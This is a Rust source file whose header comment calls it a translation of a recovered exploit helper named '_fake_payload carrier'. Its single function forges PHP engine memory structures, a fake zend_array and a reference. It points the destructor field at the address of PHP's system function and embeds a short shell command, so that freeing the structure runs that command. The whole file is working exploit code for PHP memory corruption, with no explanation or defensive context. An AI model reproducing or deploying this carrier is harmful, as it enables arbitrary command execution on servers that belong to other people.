// Translation of the recovered lib/chain.py _fake_payload carrier.
use byteorder::{ByteOrder, LittleEndian};

pub fn build_carrier(htdata: u64, zif_system: u64, cmd: &[u8]) -> (Vec<u8>, Vec<u8>) {
    assert!(cmd.len() <= 14);
    let mut zend_array = vec![0u8; 167];
    let pDestructor = zif_system;
    let execute_data = 0x20;
    let mut reference = vec![0u8; 55];
    LittleEndian::write_u32(&mut zend_array[0..], 1 as u32);
    LittleEndian::write_u32(&mut zend_array[(0) + 4..], 7 as u32);
    LittleEndian::write_u32(&mut zend_array[8..], 16 as u32);
    LittleEndian::write_u32(&mut zend_array[(8) + 4..], 4294967288 as u32);
    LittleEndian::write_u64(&mut zend_array[16..], htdata + 32 as u64);
    LittleEndian::write_u32(&mut zend_array[24..], 1 as u32);
    LittleEndian::write_u32(&mut zend_array[(24) + 4..], 1 as u32);
    LittleEndian::write_u32(&mut zend_array[32..], 8 as u32);
    LittleEndian::write_u32(&mut zend_array[(32) + 4..], 0 as u32);
    LittleEndian::write_u64(&mut zend_array[40..], 0 as u64);
    LittleEndian::write_u64(&mut zend_array[48..], pDestructor as u64);
    LittleEndian::write_u64(&mut zend_array[execute_data + 0..], 0 as u64);
    LittleEndian::write_u64(&mut zend_array[execute_data + 8..], 0 as u64);
    LittleEndian::write_u64(&mut zend_array[execute_data + 16..], pDestructor as u64);
    LittleEndian::write_u64(&mut zend_array[execute_data + 24..], 0 as u64);
    LittleEndian::write_u64(&mut zend_array[execute_data + 32..], 0 as u64);
    LittleEndian::write_u32(&mut zend_array[execute_data + 40..], 0 as u32);
    LittleEndian::write_u32(&mut zend_array[execute_data + 44..], 1 as u32);
    LittleEndian::write_u64(&mut zend_array[execute_data + 48..], 0 as u64);
    LittleEndian::write_u64(&mut zend_array[execute_data + 56..], 0 as u64);
    LittleEndian::write_u32(&mut zend_array[execute_data + 64..], 0 as u32);
    LittleEndian::write_u64(&mut zend_array[execute_data + 80..], htdata + 128 as u64);
    LittleEndian::write_u32(&mut zend_array[execute_data + 88..], 6 as u32);
    LittleEndian::write_u32(&mut zend_array[128..], 1 as u32);
    LittleEndian::write_u32(&mut zend_array[(128) + 4..], 262 as u32);
    LittleEndian::write_u64(&mut zend_array[136..], 0 as u64);
    LittleEndian::write_u64(&mut zend_array[144..], cmd.len() as u64);
    LittleEndian::write_u32(&mut reference[16..], 1 as u32);
    LittleEndian::write_u32(&mut reference[(16) + 4..], 10 as u32);
    LittleEndian::write_u64(&mut reference[24..], htdata as u64);
    LittleEndian::write_u64(&mut reference[32..], 775 as u64);
    LittleEndian::write_u64(&mut reference[40..], 0 as u64);
    zend_array[0x98..0x98 + cmd.len()].copy_from_slice(cmd);
    zend_array[0x98 + cmd.len()] = 0;
    (zend_array, reference)
}
